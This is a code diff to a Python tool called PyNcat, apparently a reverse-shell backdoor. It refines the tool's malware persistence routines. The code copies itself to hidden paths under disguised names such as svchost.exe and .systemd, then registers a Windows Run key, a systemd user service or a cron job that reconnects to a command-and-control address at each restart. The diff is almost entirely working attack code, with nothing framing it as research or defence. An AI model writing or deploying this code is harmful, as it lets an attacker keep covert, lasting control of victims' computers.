@@ -46,100 +46,93 @@ class PyNcat:
         parser.add_argument('-v', '--verbose', action='store_true')
         return parser.parse_args()
 
-             # ====================== PERSISTENCE ======================
-    def self_copy_to_hidden(self) -> Optional[str]:
-        """Copy itself to a hidden location and return new path"""
-        try:
-            original_path = os.path.abspath(sys.argv[0])
-            system = platform.system().lower()
+        # ====================== PERSISTENCE ======================
+    def self_copy_to_hidden(self) -> str:
+        """Copy itself to hidden location and return the new path"""
+        original_path = os.path.abspath(sys.argv[0])
+        system = platform.system().lower()
 
+        try:
             if system == "windows":
-                # Hidden location: %APPDATA%\Microsoft\Windows\Themes\
-                base_dir = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Themes")
-                os.makedirs(base_dir, exist_ok=True)
-                new_name = "SystemUpdate.exe" if original_path.endswith('.py') else "svchost.exe"
-                new_path = os.path.join(base_dir, new_name)
+                hidden_dir = os.path.join(os.getenv('APPDATA', ''), r"Microsoft\Windows\Themes")
+                os.makedirs(hidden_dir, exist_ok=True)
+                new_name = "SystemUpdate.exe" if original_path.lower().endswith(('.py','.pyc')) else "svchost.exe"
+                hidden_path = os.path.join(hidden_dir, new_name)
 
             elif system == "linux":
-                # Hidden location: ~/.config/.system/
-                base_dir = os.path.expanduser("~/.config/.system")
-                os.makedirs(base_dir, exist_ok=True)
-                new_name = ".dbus-update" if original_path.endswith('.py') else ".systemd"
-                new_path = os.path.join(base_dir, new_name)
+                hidden_dir = os.path.expanduser("~/.config/.system")
+                os.makedirs(hidden_dir, exist_ok=True)
+                new_name = ".dbus-update" if original_path.lower().endswith(('.py','.pyc')) else ".systemd"
+                hidden_path = os.path.join(hidden_dir, new_name)
             else:
-                logger.warning("[!] Self-copy not supported on this OS")
                 return original_path
 
-            # Copy file
             import shutil
-            if os.path.exists(new_path):
-                os.remove(new_path)
-            shutil.copy2(original_path, new_path)
-
-            # Make executable on Linux
+            if os.path.exists(hidden_path):
+                os.remove(hidden_path)
+            
+            shutil.copy2(original_path, hidden_path)
+            
             if system == "linux":
-                os.chmod(new_path, 0o755)
+                os.chmod(hidden_path, 0o755)
 
-            logger.info(f"[+] Self copied to hidden location: {new_path}")
-            return new_path
+            logger.info(f"[+] Self-copied to hidden location: {hidden_path}")
+            return hidden_path
 
         except Exception as e:
             logger.error(f"Self-copy failed: {e}")
-            return os.path.abspath(sys.argv[0])
+            return original_path
 
     def install_persistence(self):
-        """Install persistence with self-copy first"""
+        """Install persistence pointing to the HIDDEN copy"""
         if not self.args.persistent:
             return
 
-        # Step 1: Self-copy to hidden location
-        hidden_path = self.self_copy_to_hidden()
-        
-        # Step 2: Get C2 IP
-        c2_ip = self.args.connect or self._get_public_ip() or "YOUR_C2_IP_HERE"
+        # Step 1: Self-copy first
+        hidden_binary = self.self_copy_to_hidden()
 
-        logger.info(f"[*] Installing persistence using hidden binary: {hidden_path}")
-        logger.info(f"[*] C2 Target: {c2_ip}")
+        # Step 2: Get correct C2 address
+        c2_ip = self.args.connect or self._get_public_ip() or "127.0.0.1"
+        c2_port = self.args.port
+
+        base_cmd = f'"{hidden_binary}" -c {c2_ip} -p {c2_port} --ssl --persistent'
+
+        logger.info(f"[*] Installing persistence using hidden binary → {c2_ip}:{c2_port}")
 
         system = platform.system().lower()
-        
+
         if system == "windows":
-            self._windows_persistence(hidden_path, c2_ip)
+            self._windows_persistence(hidden_binary, base_cmd)
         elif system == "linux":
-            self._linux_persistence(hidden_path, c2_ip)
+            self._linux_persistence(hidden_binary, base_cmd)
         else:
-            logger.warning(f"[!] Persistence not fully supported on {system}")
+            logger.warning("[!] Persistence not supported on this platform")
 
-    def _windows_persistence(self, binary_path: str, c2_ip: str):
-        """Windows persistence using hidden binary"""
-        cmd = f'"{binary_path}" -c {c2_ip} -p 4444 --ssl --persistent'
-
+    def _windows_persistence(self, binary_path: str, cmd: str):
         try:
             import winreg
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, cmd)
+            winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, cmd)
             winreg.CloseKey(key)
-            logger.info("[+] Windows Registry persistence installed (hidden location)")
+            logger.info("[+] Windows Registry persistence installed (points to hidden copy)")
         except Exception as e:
             logger.error(f"Registry persistence failed: {e}")
 
-    def _linux_persistence(self, binary_path: str, c2_ip: str):
-        """Linux persistence"""
-        cmd = f"{binary_path} -c {c2_ip} -p 4444 --ssl --persistent"
-        
+    def _linux_persistence(self, binary_path: str, cmd: str):
         try:
+            # systemd user service
             service_path = f"{os.path.expanduser('~')}/.config/systemd/user/pyncat.service"
             os.makedirs(os.path.dirname(service_path), exist_ok=True)
-            
+
             service = f"""[Unit]
-Description=System Maintenance
+Description=System Maintenance Service
 
 [Service]
 ExecStart={cmd}
 Restart=always
-RestartSec=8
+RestartSec=7
 
 [Install]
 WantedBy=default.target
@@ -149,20 +142,20 @@ WantedBy=default.target
 
             subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
             subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True)
-            logger.info("[+] Linux systemd persistence installed")
+            logger.info("[+] Linux systemd persistence installed (hidden binary)")
         except:
-            # Fallback cron
+            # Cron fallback
             try:
                 cron_cmd = f"*/3 * * * * {cmd} >/dev/null 2>&1"
                 subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
                 logger.info("[+] Linux cron persistence installed")
             except Exception as e:
-                logger.error(f"Cron failed: {e}")
+                logger.error(f"Cron persistence failed: {e}")
 
-    def _get_public_ip(self) -> Optional[str]:
+    def _get_public_ip(self):
         try:
             import urllib.request
-            with urllib.request.urlopen('https://api.ipify.org', timeout=4) as r:
+            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as r:
                 return r.read().decode().strip()
         except:
             return None
